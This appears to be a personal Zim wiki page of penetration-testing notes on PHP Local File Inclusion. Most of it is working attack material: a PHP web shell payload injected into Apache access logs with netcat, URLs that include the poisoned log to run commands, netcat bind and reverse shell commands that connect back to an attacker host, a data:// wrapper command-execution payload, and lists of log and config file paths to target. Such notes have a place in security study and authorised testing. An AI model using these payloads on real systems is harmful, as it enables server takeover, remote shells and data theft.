Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-09-23T18:58:36-05:00

====== LFI ======
Created Thursday 23 September 2021

====== Local File Inclusion ======

A local file inclusion is a vulnerability where the server includes a local file into the running program, over which an attacker has control.

===== Indications =====
Url's like this:

{{{code: lang="html" linenumbers="False"
http://192.168.177.10/menu.php?file=current_menu.php
}}}


===== Exploitation =====

It is possible to leverage a LFI into an RCE.

Basically, the attack vector is as such:
* Figure out which webserver is running the app, and where the access log is stored.
* See if you can access the log by manupilating the GET variable
* Inject some shellcode into a request, so it'll get put in the access log
* open the access log using the LFI
* Fun, profit


===== Exploitation example (Command execution through logfile poisoning) =====
Assumption:
* Webserver is Apache
* Runs PHP
* Logfile is readable

===== Caveats =====
* Apache X logfiles are looked to root

=== First step ===
* Determine LFI entry point, webserver and if php runs
* Determine log file location

=== Second step ===
 Send this payload to the webserver
{{{code: lang="html" linenumbers="False"
<?php echo '<pre>'.shell_exec($_GET['cmd']).'</pre>'; ?>
}}}


Like this
{{{code: lang="sh" linenumbers="False"
nc -v <ip> <port>
<?php echo '<pre>'.shell_exec($GET['cmd']).'</pre>'; ?>
}}}


or like this
{{{code: lang="sh" linenumbers="False"
echo "<?php echo '<pre>'.shell_exec(\$_GET['cmd']).'</pre>'; ?>" | nc <host> <port>
}}}


This will yield the following entry in the apache log
{{{code: lang="sh" linenumbers="False"
192.168.119.177 - - [23/Sep/2021:17:44:30 -0700] "<?php echo '<pre>'.shell_exec($GET['cmd']).'</pre>'; ?>\n" 400 980 "-" "-"
}}}


=== Third step ===
Execute code by specifying the ?cmd GET parameter to the logfile.

{{{code: lang="sh" linenumbers="False"
http://vulnserver.com/vulnpage?include_file=<logfile>?cmd=<command>
}}}


===== Exploitation example (shell  through logfile poisoning) =====

Same step 1 +2 as above

=== Third step ===
{{{code: lang="sh" linenumbers="False"
http://vulnserver.com/vulnpage?include_file=<logfile>?cmd=nc.exe -l -p <port> -e cmd.exe
}}}

(Bind shell)

{{{code: lang="sh" linenumbers="False"
http://vulnserver.com/vulnpage?include_file=<logfile>?cmd=nc.exe <host> <port> -e cmd.exe
}}}

(remote shell)

If the webpage finishes loading, then nc.exe did not start.
* Either nc.exe is not installed (likely)
* Or nc.exe is not allowed to use the network (windows defender)


===== Exploitation example (command execution through php wrapper) =====
No prelimiary steps needed, just be sure PHP runs

Executing this
{{{code: lang="html" linenumbers="False"
http://vulnserver.com/vulnpage?file=data://plain/text,<pre><?php echo shell_exec('<command>');?></pre>
}}}

Will execute the command on the server

===== Enumeration =====
Again, with PHP
{{{code: lang="html" linenumbers="False"
http://192.168.177.10/menu.php?file=data:text/plain,<pre><?php phpinfo(); ?></pre>
}}}

Will give you a ton of info regarding PHP.

=== Remarks ===
The wrapper function are controller by some config items, see [[Technologies:PHP]] for more info


===== Possible access log locations =====
| Server         | Os                            | Location                            |
|:---------------|:------------------------------|:------------------------------------|
| Apache         | Linux                         | /var/log/apache2/access.log         |
|                |                               | /apache/logs/access.log             |
|                |                               | /var/log/apache/access_log          |
|                |                               | /var/log/access.log                 |
| Apache 2.4.6   | CentOS Linux release 7.6.1810 | /var/log/httpd/access_log           |
|                |                               | /var/log/httpd-access.log           |
|                |                               |                                     |
| Apache (XAMPP) | Windows                       | C:\\xampp\\apache\\logs\\access.log |
| Apache (WAMP)  | Windows                       | C:\\wamp\\logs\\access.log          |


===== Possible configuration locations =====
{{{code: lang="texinfo" linenumbers="False"
/etc/init.d/apache
/etc/init.d/apache2
/etc/httpd/httpd.conf
/etc/apache/apache.conf
/etc/apache/httpd.conf
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/usr/local/apache2/conf/httpd.conf
/usr/local/apache/conf/httpd.conf
/opt/apache/conf/httpd.conf
/home/apache/httpd.conf
/home/apache/conf/httpd.conf
/etc/apache2/sites-available/default
/etc/apache2/vhosts.d/default_vhost.include
}}}


===== Possible logfile configurations =====
{{{code: lang="texinfo" linenumbers="False"
/etc/httpd/logs/acces_log 
/etc/httpd/logs/error_log 
/var/www/logs/access_log 
/var/www/logs/access.log 
/usr/local/apache/logs/access_ log 
/usr/local/apache/logs/access. log 
/var/log/apache/access_log 
/var/log/apache2/access_log 
/var/log/apache/access.log 
/var/log/apache2/access.log
/var/log/access_log
}}}


====== See ======
[[Tools:MultiPlatform:LFISuite]]
[[Technologies:PHP]]
[[Payloads]]

https://www.itninja.com/blog/view/mysql-and-apache-profile-log-path-locations
https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html  NICE TRICK BE HERE
